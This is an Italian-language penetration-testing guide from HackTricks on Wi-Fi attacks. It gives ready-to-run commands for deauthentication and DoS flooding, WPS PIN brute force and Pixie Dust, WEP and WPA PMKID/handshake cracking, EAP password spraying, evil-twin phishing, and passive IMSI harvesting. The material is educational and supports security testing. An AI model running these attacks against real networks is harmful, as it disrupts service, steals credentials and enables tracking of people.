# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandi base WiFi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Strumenti

### Hijacker & NexMon (Wi-Fi interno di Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Esegui airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Può eseguire attacchi Evil Twin, KARMA e Known Beacons e poi usare un template di phishing per ottenere la password reale della rete o catturare le credenziali dei social network.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Questo strumento automatizza gli attacchi **WPS/WEP/WPA-PSK**. Effettuerà automaticamente:

- Imposta l'interfaccia in monitor mode
- Scansiona le possibili reti e ti permette di selezionare le vittime
- Se WEP - lancia attacchi WEP
- Se WPA-PSK
- Se WPS: Pixie dust attack e bruteforce attack (attenzione: bruteforce attack potrebbe richiedere molto tempo). Nota che non tenta null PIN o database/generated PINs.
- Prova a catturare il PMKID dall'AP per crackarlo
- Prova a deauthenticate i client dell'AP per catturare un handshake
- Se PMKID o Handshake, prova a bruteforce usando le top5000 passwords.

## Riepilogo degli attacchi

- **DoS**
- Deauthentication/disassociation -- Disconnettere tutti (o un ESSID/Client specifico)
- Random fake APs -- Nascondere reti, possibile crash dei scanner
- Overload AP -- Provare a far crashare l'AP (di solito non molto utile)
- WIDS -- Interagire con l'IDS
- TKIP, EAPOL -- Alcuni attacchi specifici per DoS di alcuni AP
- **Cracking**
- Crack **WEP** (diversi strumenti e metodi)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Utile per catturare captive portal creds e/o eseguire attacchi LAN
- **WPA-PSK** Evil Twin -- Utile per attacchi di rete se conosci la password
- **WPA-MGT** -- Utile per catturare credenziali aziendali
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Utile per catturare captive portal creds e/o eseguire attacchi LAN
- **+ WPA** -- Utile per catturare WPA handshakes

## Note rapide sulle reti Open / OWE

- **Passive capture** su open SSIDs funziona ancora con monitor mode e tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) esegue uno scambio di chiavi per stazione (no PSK), quindi gli air frames sono criptati anche su "open" SSIDs. Essendo basato su WPA3, applica anche **802.11w PMF**, che blocca frame di deauth/disassoc spoofati.
- OWE **does not authenticate** gli joiner: chiunque può associarsi, quindi **verifica client isolation** invece di fidarti delle affermazioni di marketing. Senza isolation, ARP spoofing o responder-style poisoning sul L2 locale funzionano ancora.
- **Evil Twin** rimane fattibile su SSID open/OWE presentando un segnale più forte; PMF rimuove solo la scorciatoia della deauth. Se le vittime accettano un TLS cert contraffatto, si riottiene un MitM HTTP(S) completo.
- Il broadcast poisoning su guest Wi‑Fi aperti fornisce facilmente creds/hashes (LLMNR/NBT-NS/mDNS). Vedi:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Pacchetti di deauthentication

**Descrizione da** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Gli attacchi di **Deauthentication**, un metodo diffuso nel Wi‑Fi hacking, consistono nel forgiare frame "management" per **disconnettere forzatamente i dispositivi da una rete**. Questi pacchetti non criptati ingannano i client facendoli credere che provengano dalla rete legittima, permettendo agli attaccanti di raccogliere WPA handshakes per scopi di cracking o di interrompere persistentemente le connessioni di rete. Questa tattica, allarmante nella sua semplicità, è ampiamente usata e ha implicazioni significative per la sicurezza delle reti.

**Deauthentication con Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 indica deauthentication
- 1 è il numero di deauths da inviare (puoi inviarne più di uno se vuoi); 0 significa inviarli continuamente
- -a 00:14:6C:7E:40:80 è il MAC address dell'access point
- -c 00:0F:B5:34:30:30 è il MAC address del client da deauthenticate; se questo è omesso allora viene inviata una broadcast deauthentication (non sempre funziona)
- ath0 è il nome dell'interfaccia

### Disassociation Packets

**Disassociation packets**, simili alle deauthentication packets, sono un tipo di management frame usato nelle reti Wi‑Fi. Questi pacchetti servono a interrompere la connessione tra un dispositivo (come un laptop o uno smartphone) e un access point (AP). La differenza principale tra disassociation e deauthentication risiede nei casi d'uso. Mentre un AP emette **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, riavvio o spostamento, richiedendo così la disconnessione di tutti i nodi connessi.

Questo attacco può essere eseguito con mdk4(mode "d"):
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Altri attacchi DOS di mdk4**

**Vedi** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Invia beacon frames per mostrare AP falsi ai client. Questo può talvolta mandare in crash gli scanner di rete e persino i driver!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Inviare frame di autenticazione a tutti gli Access Points (APs) accessibili nel raggio può sovraccaricare questi APs, soprattutto quando sono coinvolti numerosi client. Questo intenso traffico può portare a instabilità del sistema, facendo congelare alcuni APs o addirittura resettarli.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica se un SSID è correttamente rivelato e conferma la portata dell'AP. Questa tecnica, unita al **bruteforcing hidden SSIDs** con o senza una wordlist, aiuta a identificare e accedere a reti nascoste.

**ATTACK MODE m: Michael Countermeasures Exploitation**

L'invio di pacchetti casuali o duplicati a diverse code QoS può attivare i Michael Countermeasures su **TKIP APs**, causando lo spegnimento dell'AP per un minuto. Questo metodo è una tattica efficace di attacco **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODALITÀ DI ATTACCO e: EAPOL Start and Logoff Packet Injection**

Inondare un AP con **EAPOL Start frames** crea **fake sessions**, sovraccaricando l'AP e bloccando i client legittimi. In alternativa, l'iniezione di **fake EAPOL Logoff messages** disconnette forzatamente i client; entrambi i metodi interrompono efficacemente il servizio di rete.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacchi per IEEE 802.11s mesh networks**

Diversi attacchi sulla gestione dei link e sul routing nelle reti mesh.

**ATTACK MODE w: WIDS Confusion**

Collegare i client a più nodi WDS o a rogue APs falsi può manipolare Intrusion Detection and Prevention Systems, creando confusione e un potenziale abuso del sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Un packet fuzzer che offre diverse sorgenti di pacchetti e un set completo di modificatori per la manipolazione dei pacchetti.

### **Airggedon**

_**Airgeddon**_ offre la maggior parte degli attacchi proposti nei commenti precedenti:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) semplifica il processo di connessione dei dispositivi a un router, aumentando la velocità e la facilità di configurazione per le reti criptate con **WPA** o **WPA2** Personal. Non è efficace per la sicurezza WEP, facilmente compromessa. WPS utilizza un PIN di 8 cifre, validato in due metà, che lo rende vulnerabile ad attacchi di brute-force a causa del numero limitato di combinazioni (circa 11.000 possibilità).

### WPS Bruteforce

Ci sono 2 strumenti principali per eseguire questa azione: Reaver e Bully.

- **Reaver** è stato progettato per essere un attacco robusto e pratico contro WPS, ed è stato testato su una vasta gamma di access point e implementazioni WPS.
- **Bully** è una **nuova implementazione** dell'attacco brute force a WPS, scritta in C. Ha diversi vantaggi rispetto al codice originale di reaver: meno dipendenze, prestazioni di memoria e CPU migliorate, gestione corretta dell'endianness e un set di opzioni più robusto.

L'attacco sfrutta la vulnerabilità del **WPS PIN**, in particolare l'esposizione delle prime quattro cifre e il ruolo dell'ultima cifra come checksum, facilitando l'attacco brute-force. Tuttavia, le contromisure contro gli attacchi brute-force, come il **blocking MAC addresses** degli attaccanti aggressivi, richiedono la **MAC address rotation** per poter continuare l'attacco.

Una volta ottenuto il WPS PIN con strumenti come Bully o Reaver, l'attaccante può dedurre la WPA/WPA2 PSK, garantendo **persistent network access**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Questo approccio raffinato prende di mira i WPS PIN sfruttando vulnerabilità note:

1. **Pre-discovered PINs**: Utilizzare un database di PIN conosciuti collegati a specifici produttori noti per usare PIN WPS uniformi. Questo database correla i primi tre ottetti delle MAC-addresses con i PIN più probabili per tali produttori.
2. **PIN Generation Algorithms**: Sfruttare algoritmi come ComputePIN e EasyBox, che calcolano i WPS PIN basandosi sulla MAC-address dell'AP. L'algoritmo Arcadyan richiede inoltre un device ID, aggiungendo uno strato al processo di generazione del PIN.

### WPS Pixie Dust attack

**Dominique Bongard** ha scoperto una falla in alcuni Access Points (APs) relativa alla generazione di codici segreti, noti come **nonces** (**E-S1** e **E-S2**). Se questi nonces possono essere ricavati, il cracking del WPS PIN dell'AP diventa semplice. L'AP rivela il PIN all'interno di un codice speciale (hash) per dimostrare che è legittimo e non un AP falso (rogue). Questi nonces sono essenzialmente le "chiavi" per aprire la "cassaforte" che contiene il WPS PIN. More on this can be found [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

In termini semplici, il problema è che alcuni APs non usavano chiavi abbastanza casuali per cifrare il PIN durante il processo di connessione. Questo rende il PIN vulnerabile a essere indovinato dall'esterno della rete (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Se non vuoi passare il dispositivo in monitor mode, o `reaver` e `bully` danno qualche problema, puoi provare [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Questo strumento può eseguire Pixie Dust attack senza dover passare in monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Alcuni sistemi mal progettati consentono addirittura a un **Null PIN** (un PIN vuoto o inesistente) di concedere l'accesso, cosa piuttosto insolita. Lo strumento **Reaver** è in grado di testare questa vulnerabilità, a differenza di **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Tutti gli attacchi WPS proposti possono essere facilmente eseguiti usando _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 e 6 ti permettono di provare il **tuo PIN personalizzato** (se ne hai uno)
- 7 e 8 eseguono l'**attacco Pixie Dust**
- 13 ti permette di testare il **NULL PIN**
- 11 e 12 **recuperano i PIN relativi all'AP selezionato dalle banche dati disponibili** e **generano** possibili **PIN** usando: ComputePIN, EasyBox e opzionalmente Arcadyan (consigliato, perché no?)
- 9 e 10 testeranno **ogni possibile PIN**

## **WEP**

**Perché crolla**

- Il seed RC4 è solo **IV (24 bits) + shared key**. L'IV è in chiaro, piccolo (2^24), e si ripete rapidamente, quindi i ciphertexts con lo stesso IV riutilizzano il keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) ti permettono di “votare” i byte della chiave. **PTW** ottimizza questo usando traffico ARP per ridurre i requisiti a decine di migliaia di pacchetti invece di milioni.
- L'integrità è solo **CRC32** (lineare/non keyed), quindi un attaccante può invertire bit e ricalcolare il CRC32 senza la chiave → falsificazione/ritrasmissione/iniezione ARP dei pacchetti mentre aspetta gli IVs.

La rottura pratica è deterministica:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon offre ancora un workflow WEP "All-in-One" se preferisci una UI guidata.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

Many modern routers add an **campo opzionale** al **primo frame EAPOL** durante l'associazione, noto come `Robust Security Network`. Questo include il `PMKID`.

As the original post explains, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dato che il "PMK Name" è costante, conosciamo la BSSID dell'AP e della station, e il `PMK` è identico a quello di una full 4-way handshake, **hashcat** può usare queste informazioni per crack the PSK e recover the passphrase!

Per **gather** queste informazioni e **bruteforce** localmente la password puoi fare:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
I **PMKIDs catturati** saranno mostrati nella **console** e anche **salvati** dentro \_ **/tmp/attack.pcap**\_\
Ora, converti la cattura al formato **hashcat/john** e craccala:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Nota che il formato di un hash corretto contiene **4 parti**, ad esempio: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Se il tuo contiene **solo** **3 parti**, allora è **invalido** (la cattura PMKID non era valida).

Nota che `hcxdumptool` **cattura anche handshakes** (apparirà qualcosa del tipo: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Puoi **trasformare** gli **handshakes** nel formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ho notato che alcuni handshakes catturati con questo tool non potevano essere cracked anche conoscendo la password corretta. Consiglio di catturare gli handshakes anche con il metodo tradizionale se possibile, oppure di catturarne diversi usando questo tool._

### Handshake capture

Un attacco alle reti **WPA/WPA2** può essere eseguito catturando un **handshake** e tentando il **crack** della password **offline**. Questo processo comporta il monitoraggio della comunicazione di una rete specifica e del **BSSID** su un particolare **channel**. Ecco una guida sintetica:

1. Identifica il **BSSID**, il **channel** e un **connected client** della rete target.
2. Usa `airodump-ng` per monitorare il traffico di rete sul **channel** e sul **BSSID** specificati, nella speranza di catturare un **handshake**. Il comando sarà simile a questo:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Per aumentare la probabilità di catturare un handshake, disconnettere momentaneamente il client dalla rete per forzare una ri-autenticazione. Questo può essere fatto usando il comando `aireplay-ng`, che invia deauthentication packets al client:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Nota che, poiché il client è stato deauthenticated, potrebbe tentare di connettersi a un AP diverso o, in altri casi, a una rete diversa._

Quando in `airodump-ng` appaiono alcune informazioni sul handshake, significa che il handshake è stato catturato e puoi smettere di ascoltare:

![](<../../images/image (172) (1).png>)

Una volta catturato il handshake, puoi eseguirne il **crack** con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificare se l'handshake è nel file

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se questo strumento trova un handshake incompleto di un ESSID prima di quello completato, non rileverà quello valido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Indovinamento PSK online più veloce via socket ctrl di `wpa_supplicant` (no clients/PMKID)

Quando non ci sono client nelle vicinanze e l'AP rifiuta PMKID, puoi iterare i PSK online senza riavviare i supplicants:

- Modifica `wpa_supplicant.c` per forzare `dur = 0;` nella logica di backoff per i fallimenti di auth (intorno a `ssid->auth_failures`), disabilitando di fatto il temporary-disable timer.
- Esegui un singolo daemon con un control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Pilotarlo tramite l'interfaccia di controllo, riutilizzando lo stesso scan e network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Un piccolo loop Python che legge gli eventi del socket (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) può testare ~100 tentativi in ~5 minuti senza scan overhead. È comunque rumoroso e rilevabile, ma evita il riavvio del processo ad ogni tentativo e i ritardi di backoff.

## **WPA Enterprise (MGT)**

In **enterprise WiFi setups, incontrerai vari metodi di autenticazione**, ognuno dei quali offre diversi livelli di sicurezza e funzionalità di gestione. Quando usi strumenti come `airodump-ng` per ispezionare il traffico di rete, potresti notare identificatori per questi tipi di autenticazione. Alcuni metodi comuni includono:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Questo metodo supporta hardware token e one-time passwords all'interno di EAP-PEAP. A differenza di MSCHAPv2, non usa un peer challenge e invia le password in chiaro all'access point, esponendo a rischi di downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Prevede l'invio dell'hash MD5 della password dal client. Non è **raccomandato** a causa della vulnerabilità ad attacchi dizionario, della mancanza di autenticazione del server e dell'incapacità di generare chiavi WEP specifiche per la sessione.
3. **EAP-TLS (Transport Layer Security)**:
- Utilizza certificati sia client-side che server-side per l'autenticazione e può generare dinamicamente chiavi WEP basate sull'utente e sulla sessione per proteggere le comunicazioni.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fornisce autenticazione reciproca tramite un tunnel cifrato, insieme a un metodo per derivare chiavi WEP dinamiche per utente e per sessione. Richiede solo certificati server-side, con i client che usano credenziali.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funziona in modo simile a EAP creando un TLS tunnel per la comunicazione protetta. Permette l'uso di protocolli di autenticazione più deboli sopra EAP grazie alla protezione offerta dal tunnel.
- **PEAP-MSCHAPv2**: Spesso indicato come PEAP, combina il meccanismo challenge/response vulnerabile di MSCHAPv2 con un TLS tunnel protettivo.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Simile a EAP-TLS ma avvia il TLS tunnel prima dello scambio dei certificati, offrendo un ulteriore livello di sicurezza.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

Even using one of the most secure of authentication methods: **PEAP-EAP-TLS**, it is possible to **capture the username sent in the EAP protocol**. To do so, **capture a authentication communication** (start `airodump-ng` inside a channel and `wireshark` in the same interface) and filter the packets by`eapol`.\
Inside the "**Response, Identity**" packet, the **username** of the client will appear.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding is supported by both EAP-PEAP and EAP-TTLS. In the context of a WiFi network, an EAP-Identity request is typically initiated by the access point (AP) during the association process. To ensure the protection of user anonymity, the response from the EAP client on the user's device contains only the essential information required for the initial RADIUS server to process the request. This concept is illustrated through the following scenarios:

- EAP-Identity = anonymous
- In this scenario, all users employ the pseudonymous "anonymous" as their user identifier. The initial RADIUS server functions as either an EAP-PEAP or EAP-TTLS server, responsible for managing the server-side of the PEAP or TTLS protocol. The inner (protected) authentication method is then either handled locally or delegated to a remote (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- In this situation, users from different realms conceal their identities while indicating their respective realms. This allows the initial RADIUS server to proxy the EAP-PEAP or EAP-TTLS requests to RADIUS servers in their home realms, which act as the PEAP or TTLS server. The initial RADIUS server operates solely as a RADIUS relay node.
- Alternatively, the initial RADIUS server may function as the EAP-PEAP or EAP-TTLS server and either handle the protected authentication method or forward it to another server. This option facilitates the configuration of distinct policies for various realms.

In EAP-PEAP, once the TLS tunnel is established between the PEAP server and the PEAP client, the PEAP server initiates an EAP-Identity request and transmits it through the TLS tunnel. The client responds to this second EAP-Identity request by sending an EAP-Identity response containing the user's true identity through the encrypted tunnel. This approach effectively prevents the revelation of the user's actual identity to anyone eavesdropping on the 802.11 traffic.

EAP-TTLS follows a slightly different procedure. With EAP-TTLS, the client typically authenticates using PAP or CHAP, secured by the TLS tunnel. In this case, the client includes a User-Name attribute and either a Password or CHAP-Password attribute in the initial TLS message sent after tunnel establishment.

Regardless of the protocol chosen, the PEAP/TTLS server obtains knowledge of the user's true identity after the TLS tunnel has been established. The true identity can be represented as user@realm or simply user. If the PEAP/TTLS server is also responsible for authenticating the user, it now possesses the user's identity and proceeds with the authentication method protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user's home RADIUS server. This new RADIUS request omits the PEAP or TTLS protocol layer. In cases where the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user's true identity, replacing the anonymous User-Name from the incoming RADIUS request. When the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes extracted from the TLS payload are substituted in the outgoing RADIUS message, displacing the anonymous User-Name and TTLS EAP-Message attributes found in the incoming RADIUS request.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Note:
- Funziona prima di qualsiasi tunnel TLS se l'implementazione usa EAP‑SIM/AKA nudo senza identità esterne anonime (pseudonyms).
- Il valore esposto è un identificatore permanente legato alla SIM dell'abbonato; la sua raccolta consente il tracciamento a lungo termine e ulteriori abusi nelle reti telecom.

Impatto
- Privacy: tracciamento persistente di utenti/dispositivi tramite catture Wi‑Fi passive in luoghi pubblici.
- Avvio di abusi telecom: con l'IMSI, un attacker con accesso SS7/Diameter può interrogare la posizione o tentare l'intercettazione di chiamate/SMS e il furto di MFA.

Mitigazioni / cosa cercare
- Verificare che i client usino identità esterne anonime (pseudonyms) per EAP‑SIM/AKA come da linee guida 3GPP (es., 3GPP TS 33.402).
- Preferire il tunneling della fase di identità (es., EAP‑TTLS/PEAP che trasporta l'EAP‑SIM/AKA interno) in modo che l'IMSI non sia mai inviato in chiaro.
- Le catture dei pacchetti di association/auth non dovrebbero mai rivelare un IMSI raw in EAP-Response/Identity.

Correlato: Sfruttamento della segnalazione telecom con identificatori mobili catturati
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Se ci si aspetta che il client usi una **username and password** (nota che **EAP-TLS won't be valid** in questo caso), puoi provare a ottenere una **list** di **usernames** (vedi la parte successiva) e **passwords** e tentare di **bruteforce** l'accesso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Puoi anche effettuare questo attacco usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria sugli attacchi client

### Selezione della rete e roaming

- Il protocollo 802.11 definisce come una stazione si unisce a un Extended Service Set (ESS) ma non specifica i criteri per la selezione di un ESS o di un access point (AP) al suo interno.
- Le stazioni possono effettuare roaming tra AP che condividono lo stesso ESSID, mantenendo la connettività in un edificio o in un'area.
- Il protocollo richiede che la stazione si autentichi all'ESS ma non impone che l'AP si autentichi verso la stazione.

### Preferred Network Lists (PNL)

- Le stazioni memorizzano l'ESSID di ogni rete wireless a cui si connettono nella loro Preferred Network List (PNL), insieme ai dettagli di configurazione specifici della rete.
- La PNL viene utilizzata per connettersi automaticamente a reti note, migliorando l'esperienza utente semplificando il processo di connessione.

### Passive Scanning

- Gli AP inviano periodicamente beacon frames, annunciando la loro presenza e le loro funzionalità, incluso l'ESSID dell'AP a meno che la trasmissione non sia disabilitata.
- Durante la passive scanning, le stazioni ascoltano i beacon frames. Se l'ESSID di un beacon corrisponde a una voce nella PNL della stazione, la stazione può connettersi automaticamente a quell'AP.
- La conoscenza della PNL di un dispositivo consente di sfruttarlo potenzialmente imitando l'ESSID di una rete nota e inducendo il dispositivo a connettersi a un rogue AP.

### Active Probing

- L'active probing implica che le stazioni inviino probe requests per scoprire gli AP vicini e le loro caratteristiche.
- I directed probe requests mirano a un ESSID specifico, aiutando a rilevare se una particolare rete è nel raggio d'azione, anche se è una rete nascosta.
